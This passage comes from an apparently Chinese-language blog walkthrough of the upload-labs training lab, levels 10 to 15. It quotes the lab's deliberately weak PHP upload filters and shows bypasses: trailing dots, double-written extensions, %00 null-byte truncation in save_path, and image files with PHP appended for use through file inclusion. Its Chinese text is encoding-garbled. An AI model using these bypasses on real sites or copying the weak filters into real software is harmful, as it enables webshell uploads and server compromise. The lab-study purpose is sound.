class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span><br><br>        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span><br>        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//é¦–å°¾å»ç©º</span><br>        <br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-comment">#åŸ$img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</span><br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><h3 id="bypass-9"><a href="#bypass-9" class="headerlink" title="bypass"></a>bypass</h3><p>æŠ“åŒ…ï¼Œåœ¨åç¼€åŠ ä¸Š<code>&#39;. .&#39;</code>ï¼š</p><p><img src="https://i.loli.net/2021/02/13/87fqU23YhwFBseS.png"></p><p>æœ€ç»ˆå¾—åˆ°çš„æ–‡ä»¶åç¼€ä¸º<code>&#39;. &#39;</code></p><p><img src="https://i.loli.net/2021/02/13/Ufm2tkGdD14Hai9.png"></p><h2 id="pass11ï¼ˆé»‘åå•-åŒå†™ç»•è¿‡ï¼‰"><a href="#pass11ï¼ˆé»‘åå•-åŒå†™ç»•è¿‡ï¼‰" class="headerlink" title="pass11ï¼ˆé»‘åå•-åŒå†™ç»•è¿‡ï¼‰"></a>pass11ï¼ˆé»‘åå•-åŒå†™ç»•è¿‡ï¼‰</h2><h3 id="åˆ†æ-10"><a href="#åˆ†æ-10" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç›´æ¥ä¸Šä¼ ï¼Œå‘ç°å°†åç¼€åç½®æ¢ä¸ºç©ºäº†ï¼Œè¿™æ—¶å€™å¯ä»¥è¯•ä¸€ä¸‹å¤§å°å†™ã€åŒå†™</p><p><img src="https://i.loli.net/2021/02/13/tHw2vsWTYKxJb7f.png"></p><h3 id="bypass-10"><a href="#bypass-10" class="headerlink" title="bypass"></a>bypass</h3><p>å¤§å°å†™ï¼ˆPhPï¼‰ä»è¢«ç½®æ¢ä¸ºç©º</p><p>å°è¯•åŒå†™ç»•è¿‡ï¼š</p><p><img src="https://i.loli.net/2021/02/13/ZJQNa5wS814hl7F.png"></p><p>æˆåŠŸå•¦</p><p>çœ‹ä¸€ä¸‹æºç <strong>ï¼ˆå°†ç¬¦å·æ•°ç»„deny_extçš„å…¨éƒ¨ç½®æ¢ä¸ºç©ºï¼‰</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);<span class="hljs-comment">#å°†ç¬¦å·æ•°ç»„deny_extçš„å…¨éƒ¨ç½®æ¢ä¸ºç©º</span><br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;        <br></code></pre></td></tr></table></figure><h2 id="pass12ï¼ˆç™½åå•-00æˆªæ–­GETï¼‰"><a href="#pass12ï¼ˆç™½åå•-00æˆªæ–­GETï¼‰" class="headerlink" title="pass12ï¼ˆç™½åå•-00æˆªæ–­GETï¼‰"></a>pass12ï¼ˆç™½åå•-00æˆªæ–­GETï¼‰</h2><h3 id="åˆ†æ-11"><a href="#åˆ†æ-11" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>éšä¾¿ä¸Šä¼ ä¸ªphpæ–‡ä»¶ï¼Œæç¤ºåªèƒ½ä¸Šä¼ jpgã€pngã€gifï¼ˆç™½åå•ï¼‰</p><p><img src="https://i.loli.net/2021/02/13/5cjsuKXEQq9l7Bg.png"></p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br></code></pre></td></tr></table></figure><p>æç¤ºï¼šä¸Šä¼ è·¯å¾„å¯æ§ï¼Œå³å¯é€šè¿‡urlä¼ å‚<code>save_path</code>æ§åˆ¶æœ€ç»ˆè·¯å¾„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br></code></pre></td></tr></table></figure><p>ç”±æ­¤ï¼š</p><p>1.ä¸Šä¼ åç¼€ä¸ºjpg | png | gif çš„æ–‡ä»¶å®ç°ä¸Šä¼ </p><p>2.åˆ©ç”¨save_pathå®ç°00æˆªæ–­</p><h3 id="bypass-11"><a href="#bypass-11" class="headerlink" title="bypass"></a>bypass</h3><p>00æˆªæ–­ï¼š</p><p>è¿™é‡Œæ˜¯é€šè¿‡ä¸Šä¼ save_pathæˆªæ–­æ–‡ä»¶å~</p><p>æ¡ä»¶ï¼š</p><blockquote><p>PHP &lt; 5.3.4</p><p>magic_quotes_gpc å…³é—­</p></blockquote><p>åŸç†ï¼š</p><blockquote><p><code>0x00</code>æ˜¯å­—ç¬¦ä¸²çš„ç»“æŸæ ‡å¿—ç¬¦ï¼Œæ‰€ä»¥phpåœ¨è¯»å–åˆ°<code>0x00</code>æ—¶å°±ä¸ä¼šå†å¾€åè¯»å–ï¼Œå¯ä»¥åˆ©ç”¨è¿™äº›æˆªæ–­å­—ç¬¦åé¢ä¸éœ€è¦çš„å†…å®¹</p><p>phpçš„ä¸€äº›å‡½æ•°çš„åº•å±‚æ˜¯Cè¯­è¨€ï¼Œè€Œmove_uploaded_fileå°±æ˜¯å…¶ä¸­ä¹‹ä¸€ï¼Œé‡åˆ°0x00ä¼šæˆªæ–­</p><p>0xè¡¨ç¤º16è¿›åˆ¶ï¼ŒURLä¸­%00è§£ç æˆ16è¿›åˆ¶å°±æ˜¯0x00</p></blockquote><p>åˆ©ç”¨ï¼š</p><p>1.ä¸Šä¼ info.jpgï¼ˆè¦æŠ“åŒ…ï¼ï¼ï¼ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> phpinfo(); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æŠ“åŒ…ï¼š</p><p>urlä¸­ä¼ å‚æ§åˆ¶ä¸Šä¼ è·¯å¾„ï¼š<code>save_path=../upload/info.php%00</code></p><p><img src="https://i.loli.net/2021/02/13/lw5OPL4GNtpTmAa.png"></p><p>ä¸Šä¼ åå¾—åˆ°çš„è·¯å¾„ä¸ºï¼š<img src="https://i.loli.net/2021/02/13/Q3HwEo7D6nxcvuO.png"></p><p>å¦‚æœç›´æ¥è®¿é—®ä¼š404ï¼Œè¦åˆ æ‰phpåé¢é‚£ä¸€æ®µæ‰èƒ½æˆåŠŸè®¿é—®ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://i.loli.net/2021/02/13/yH6smeXqw3DAE8L.png"></p><h2 id="pass13ï¼ˆç™½åå•-00æˆªæ–­postï¼‰"><a href="#pass13ï¼ˆç™½åå•-00æˆªæ–­postï¼‰" class="headerlink" title="pass13ï¼ˆç™½åå•-00æˆªæ–­postï¼‰"></a>pass13ï¼ˆç™½åå•-00æˆªæ–­postï¼‰</h2><h3 id="åˆ†æ-12"><a href="#åˆ†æ-12" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>éšä¾¿ä¸Šä¼ ä¸ªphpæ–‡ä»¶ï¼Œæç¤ºåªèƒ½ä¸Šä¼ jpgã€pngã€gifï¼ˆç™½åå•ï¼‰</p><p><img src="https://i.loli.net/2021/02/13/5cjsuKXEQq9l7Bg.png"></p><p>æºç ï¼šä¸12ä¸åŒçš„æ˜¯ï¼š<code>$_POST[&#39;save_path&#39;]</code>ä½¿ç”¨postä¼ å‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>   <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],strrpos(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>   <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>       <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>       <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br></code></pre></td></tr></table></figure><h3 id="bypass-12"><a href="#bypass-12" class="headerlink" title="bypass"></a>bypass</h3><p>å› ä¸ºæ˜¯POSTå‹ï¼Œæ— æ³•åœ¨urlä¸­ä¿®æ”¹</p><p>å…ˆå°†è·¯å¾„æ”¹ä¸º<code>../upload/info.phpa</code>ï¼›è¿™é‡Œçš„aæ˜¯ä¸ºäº†æ–¹ä¾¿åé¢ä¿®æ”¹ä¸º0x00</p><p><img src="https://i.loli.net/2021/02/13/Wnyzeft93PbLgoG.png"></p><p>00æˆªæ–­çš„00æœ¬å°±æ˜¯æŒ‡åå…­è¿›åˆ¶çš„0x00ï¼Œå› æ­¤æˆ‘ä»¬é€‰æ‹©hexï¼Œç„¶åæ‰¾åˆ°açš„åå…­è¿›åˆ¶61æ‰€åœ¨ï¼Œå°†å…¶æ”¹ä¸º00</p><p><img src="https://i.loli.net/2021/02/13/LefqkVtg7c8ayH9.png"></p><p>æ”¾åŒ…å³å¯</p><p>è®¿é—®æ—¶åŒ12ï¼Œéœ€å°†phpåçš„ä¸œè¥¿éƒ½åˆ æ‰ï¼Œä¸ç„¶å°±ä¼š404</p><p><img src="https://i.loli.net/2021/02/13/jtyLAs6GxVzQmgF.png" alt="åˆ æ‰å‰"><br><img src="https://i.loli.net/2021/02/13/cFpTkiMxnRU164I.png" alt="åˆ æ‰å"></p><h2 id="pass14ï¼ˆå›¾ç‰‡ğŸï¼‰"><a href="#pass14ï¼ˆå›¾ç‰‡ğŸï¼‰" class="headerlink" title="pass14ï¼ˆå›¾ç‰‡ğŸï¼‰"></a>pass14ï¼ˆå›¾ç‰‡ğŸï¼‰</h2><h3 id="åˆ†æ-13"><a href="#åˆ†æ-13" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å¦‚å›¾ï¼š</p><p><img src="https://i.loli.net/2021/02/13/nbCm3BrocN8FweK.png"></p><p>é‚£ä¹ˆå’±ä»¬å°±æ¥ä¸Šä¼ å›¾ç‰‡ğŸå§</p><p>å¹¶ä¸”æç¤ºï¼šæœ¬passæ£€æŸ¥å›¾æ ‡å†…å®¹å¼€å¤´2ä¸ªå­—èŠ‚</p><p>ä¹Ÿå°±æ˜¯è¯´å•çº¯åŒ…å«ä¸€å¥è¯æœ¨é©¬ï¼Œåªæ˜¯ä¿®æ”¹ä¸ªåç¼€åæ˜¯ä¸è¡Œçš„ï¼Œå¿…é¡»å…·æœ‰å›¾ç‰‡ç‰¹å¾(ä¹Ÿå°±æ˜¯å›¾ç‰‡å¤´å•¦)ã€‚åœ¨å¾ˆå¤šctfé¢˜ä¹Ÿæœ‰è¿™æ ·çš„è¦æ±‚~</p><blockquote><p>å–ä¸€éƒ¨åˆ†â€“</p><p>JPG:<code>Ã¿Ã˜Ã¿Ã ..JFIF..........Ã¿</code> </p><p>â€‹            hex:<code>FF D8 FF E0 00 10 4A 46 49 46 00 01 01 00 00 01 00 01 00 00 FF</code></p><p>PNG:<code>â€°PNG........IHDR</code>    </p><p>â€‹            hex:<code>89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</code></p><p>GIF: <code>GIF89a#</code>                        </p><p>â€‹            hex:<code>47 49 46 38 39 61 23</code></p></blockquote><p>å¹¶ä¸”å›¾ç‰‡é©¬éœ€è¦æ­é…æ–‡ä»¶åŒ…å«æ¼æ´ä½¿ç”¨~</p><h3 id="bypass-13"><a href="#bypass-13" class="headerlink" title="bypass"></a>bypass</h3><p>1ã€å‡†å¤‡<code>å›¾ç‰‡ğŸ</code></p><p>å›¾ç‰‡é©¬çš„åŸç†æ˜¯ä¸ç ´åæ–‡ä»¶æœ¬èº«çš„æ¸²æŸ“æƒ…å†µä¸‹æ‰¾ä¸€ä¸ªç©ºç™½åŒºè¿›è¡Œå¡«å……ä»£ç ï¼Œä¸€èˆ¬ä¼šæ˜¯å›¾ç‰‡çš„æ³¨é‡ŠåŒº</p><p>ä¸€ä¸ªæ­£å¸¸å›¾ç‰‡ 1.jpgï¼›ä¸€ä¸ªåŒ…å«ğŸçš„1.phpæ–‡ä»¶ï¼›åˆå¹¶åå¾—åˆ°åä¸º2.jpgçš„å›¾ç‰‡ğŸ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">cmdä¸­ï¼š</span><br><span class="hljs-meta">#</span><span class="bash">/bæŒ‡å®šä»¥äºŒè¿›åˆ¶æ ¼å¼å¤åˆ¶ã€åˆå¹¶æ–‡ä»¶; ç”¨äºå›¾åƒç±»/å£°éŸ³ç±»æ–‡ä»¶</span><br><span class="hljs-meta">#</span><span class="bash">/aæŒ‡å®šä»¥ASCIIæ ¼å¼å¤åˆ¶ã€åˆå¹¶æ–‡ä»¶ã€‚ç”¨äºtxtç­‰æ–‡æ¡£ç±»æ–‡ä»¶</span><br>copy  1.jpg/b + 1.php/a  2.jpg<br></code></pre></td></tr></table></figure><p>æˆ–è€…ç›´æ¥åå…­è¿›åˆ¶æ‰“å¼€å›¾ç‰‡ï¼Œå°†ä¸€å¥è¯æœ¨é©¬æ’å…¥æœ€åº•å±‚</p><p><img src="https://i.loli.net/2021/02/13/uOTLmlvSxt8aeRr.png"></p><p>2ã€ä¸Šä¼ æœ¨é©¬ï¼Œç„¶ååˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è¯»å–</p><p>è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨çš„æ˜¯upload-labsè‡ªå¸¦çš„include.phpï¼Œè·¯å¾„å¦‚ä¸‹</p><p><img src="https://i.loli.net/2021/02/13/ag5bkDSr2vVnYAw.png"></p><p>ä¼ å‚ <code>file=å›¾ç‰‡ğŸè·¯å¾„</code>å³å¯,å¦‚ä¸‹</p><p><img src="https://i.loli.net/2021/02/13/KdpkFAJ9ZP14GHI.png"></p><p>æ­¤å¤„æˆ‘ä¸Šä¼ çš„å›¾ç‰‡é©¬åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œå±äºå›¾ç‰‡éƒ¨åˆ†çš„ä»…æ˜¯ä¸Šå›¾çª—å£å·¦ä¸Šè§’é‚£äº›ï¼Œä½œä¸ºåˆ¤æ–­å›¾ç‰‡ç±»å‹çš„æ ‡å‡†</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-variable">$file</span> = fopen(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-variable">$bin</span> = fread(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//åªè¯»2å­—èŠ‚ï¼›è¯»å–ä¸Šä¼ æ–‡ä»¶çš„å‰ä¸¤ä¸ªå­—èŠ‚å†…å®¹</span><br>    fclose(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$strInfo</span> = @unpack(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);    <span class="hljs-comment">#unpackè§£ç </span><br>    <span class="hljs-variable">$typeCode</span> = intval(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);    <span class="hljs-comment">#è½¬æ¢ä¸º10è¿›åˆ¶ï¼ˆé»˜è®¤ä¸º10è¿›åˆ¶ï¼‰</span><br>    <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;    <br>    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;      <span class="hljs-comment">#æ ¹æ®è½¬æ¢åçš„ç»“æœåˆ¤æ–­å›¾ç‰‡ç±»å‹</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;        <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;<br>        &#125;    <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="pass15ï¼ˆå›¾ç‰‡ğŸ-getimagesizeï¼‰"><a href="#pass15ï¼ˆå›¾ç‰‡ğŸ-getimagesizeï¼‰" class="headerlink" title="pass15ï¼ˆå›¾ç‰‡ğŸ-getimagesizeï¼‰"></a>pass15ï¼ˆå›¾ç‰‡ğŸ-getimagesizeï¼‰</h2><h3 id="åˆ†æ-14"><a href="#åˆ†æ-14" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>åŒæ ·æ˜¯ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œæ¥çœ‹ä¸€ä¸‹åˆ¤æ–­å‡½æ•°~</p><p>tips:ä½¿ç”¨getimagesize()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-variable">$types</span> = <span class="hljs-string">&#x27;.jpeg|.png|.gif&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-variable">$info</span> = getimagesize(<span class="hljs-variable">$filename</span>);    <span class="hljs-comment">#è·å–å›¾åƒä¿¡æ¯ï¼Œè¿”å›å€¼ä¸ºåŒ…å«å›¾åƒä¿¡æ¯çš„æ•°ç»„</span><br>        <span class="hljs-variable">$ext</span> = image_type_to_extension(<span class="hljs-variable">$info</span>[<span class="hljs-number">2</span>]);<span class="hljs-comment">#è·å–å›¾åƒç±»å‹çš„æ–‡ä»¶æ‰©å±•å</span><br>        <span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$types</span>,<span class="hljs-variable">$ext</span>)&gt;=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$ext</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 